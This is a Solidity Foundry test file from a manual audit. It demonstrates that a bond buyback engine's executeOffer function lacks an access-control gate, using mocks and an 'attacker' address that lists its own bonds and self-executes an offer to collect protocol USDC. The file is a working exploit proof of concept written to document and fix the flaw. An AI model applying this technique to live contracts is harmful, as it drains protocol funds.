// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../../src/marketplace/BuybackEngine.sol";

/// @title MR-M04 PoC — BuybackEngine.executeOffer is permissionless
/// @notice Sprint 7.3 Manual Review. `executeOffer` is `external nonReentrant`
///         with NO `onlyRole(BUYBACK_OPERATOR_ROLE)` gate (cf. `setDailyBuyback`,
///         which IS gated). So while a buyback window is open, ANY address — not
///         the operator — can drive the engine to buy a chosen listing at up to
///         the cap price and trigger the double-burn. An attacker lists their own
///         bonds at the cap and self-executes, steering the daily budget to
///         themselves on their own schedule. NOT run on testnet; local forge only.
contract MR_M04_ExecuteOfferOpen_PoC is Test {
    BuybackEngine engine;
    MockUSDC usdc;
    MockMarketplace marketplace;
    MockClaimBond claimBond;
    MockBondVault bondVault;
    MockSolvency solvency;
    MockCapacity capacity;

    address operator = makeAddr("operator");
    address attacker = makeAddr("attacker"); // holds NO role

    function setUp() public {
        usdc = new MockUSDC();
        marketplace = new MockMarketplace(usdc);
        claimBond = new MockClaimBond();
        bondVault = new MockBondVault();
        solvency = new MockSolvency();
        capacity = new MockCapacity();

        BuybackEngine impl = new BuybackEngine();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(
                BuybackEngine.initialize.selector,
                address(claimBond),
                address(bondVault),
                address(solvency),
                address(capacity),
                address(marketplace),
                address(usdc),
                operator // multisig owner == operator
            )
        );
        engine = BuybackEngine(address(proxy));

        // Operator opens a normal daily buyback window (this part is correctly gated).
        vm.prank(operator);
        engine.setDailyBuyback(10_000e6, 95, 24); // $10k budget, 95% cap, 24h

        // Fund the engine with USDC to spend.
        usdc.mint(address(engine), 10_000e6);
    }

    /// MR-M04: a NON-operator (the attacker) successfully executes a buyback offer
    /// against their OWN listing at the 95% cap. No access-control revert occurs.
    function test_NonOperatorCanExecuteOffer() public {
        // Attacker lists their own bonds: epoch with $1 face, 1000 units => $1000
        // face; priced at 95% => 950 USDC (6-dec), within the cap.
        uint256 listingId = marketplace.createListing(attacker, /*epochId*/ 202805, /*amount*/ 1000, /*priceUSDC*/ 950e6);

        uint256 attackerBefore = usdc.balanceOf(attacker);

        // The attacker — who holds NEITHER BUYBACK_OPERATOR_ROLE nor admin — calls
        // executeOffer directly. If a role gate existed this would revert with an
        // AccessControl error; it does NOT.
        vm.prank(attacker);
        engine.executeOffer(listingId);

        // The protocol paid the attacker (minus marketplace fee) for their own bonds.
        assertGt(usdc.balanceOf(attacker), attackerBefore, "attacker received protocol USDC via self-executed offer");

        // And the budget was consumed by an unprivileged caller.
        // (spentToday is internal to the struct; the balance movement above is the
        // observable proof that the unprivileged path ran to completion.)
    }

    /// Control: the operator-gated config path DOES revert for the attacker,
    /// proving the role exists and only `executeOffer` is missing the gate.
    function test_ConfigPathIsGated_OfferPathIsNot() public {
        vm.prank(attacker);
        vm.expectRevert(); // AccessControl: attacker lacks BUYBACK_OPERATOR_ROLE
        engine.setDailyBuyback(1, 1, 1);
    }
}

// ───────────────────────── minimal mocks ─────────────────────────

contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }

    function decimals() public pure override returns (uint8) {
        return 6;
    }
}

contract MockMarketplace {
    MockUSDC public usdc;

    struct L {
        address seller;
        uint256 epochId;
        uint256 amount;
        uint256 priceUSDC;
        bool active;
    }

    mapping(uint256 => L) public listings;
    uint256 public next = 1;

    constructor(MockUSDC _usdc) {
        usdc = _usdc;
    }

    function createListing(address seller, uint256 epochId, uint256 amount, uint256 priceUSDC)
        external
        returns (uint256 id)
    {
        id = next++;
        listings[id] = L(seller, epochId, amount, priceUSDC, true);
    }

    function getListing(uint256 id)
        external
        view
        returns (address seller, uint256 epochId, uint256 amount, uint256 priceUSDC, bool active)
    {
        L memory l = listings[id];
        return (l.seller, l.epochId, l.amount, l.priceUSDC, l.active);
    }

    function BUYER_FEE_BPS() external pure returns (uint256) {
        return 150;
    }

    function BPS_DENOMINATOR() external pure returns (uint256) {
        return 10000;
    }

    /// @dev Models the real flow: pull (price + buyerFee) from the engine and pay
    ///      the seller their net. Proves the protocol's USDC reaches the attacker.
    function executeBuy(uint256 id) external {
        L storage l = listings[id];
        require(l.active, "inactive");
        l.active = false;
        uint256 buyerFee = (l.priceUSDC * 150) / 10000;
        usdc.transferFrom(msg.sender, address(this), l.priceUSDC + buyerFee);
        uint256 sellerFee = (l.priceUSDC * 150) / 10000;
        usdc.transfer(l.seller, l.priceUSDC - sellerFee); // seller (attacker) gets paid
    }
}

contract MockClaimBond {
    function getFaceValue(uint256) external pure returns (uint256) {
        return 1e18; // $1 face per unit (18-dec)
    }

    function burnByHolder(address, uint256, uint256) external {}
}

contract MockBondVault {
    function decreaseObligations(uint256) external {}
    function burnFromReserves(uint256) external {}
}

contract MockSolvency {
    // Below MIN_SOLVENCY_FOR_DOUBLE_BURN (15000) so _executeDoubleBurn short-circuits
    // (the buy already proves the access-control gap; burn pathing is orthogonal).
    function getSolvencyRatio() external pure returns (uint256) {
        return 10000;
    }
}

contract MockCapacity {
    function getLuminaPrice() external pure returns (uint256) {
        return 0.036e18;
    }
}
